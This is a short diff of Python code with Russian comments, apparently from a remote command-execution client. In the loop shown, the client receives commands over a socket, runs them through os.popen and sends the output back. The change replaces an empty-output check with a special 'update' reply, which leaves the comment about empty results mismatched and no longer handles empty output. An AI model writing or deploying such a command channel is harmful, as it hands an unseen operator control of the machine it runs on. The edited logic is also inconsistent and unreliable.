@@ -10,8 +10,8 @@ while True:
                 data = sock.recv(1024).decode()  # получаем команду
                 aa = os.popen(data)
                 result = aa.read()
-                if len(result) == 0:
-                    sock.send(" ".encode())  # в случае, если рзультат
+                if data == "update":
+                    sock.send("Updating..".encode())  # в случае, если рзультат
                     # пустой, отправляем пробел
                 else:
                     sock.send(result.encode())  # отправляем результат
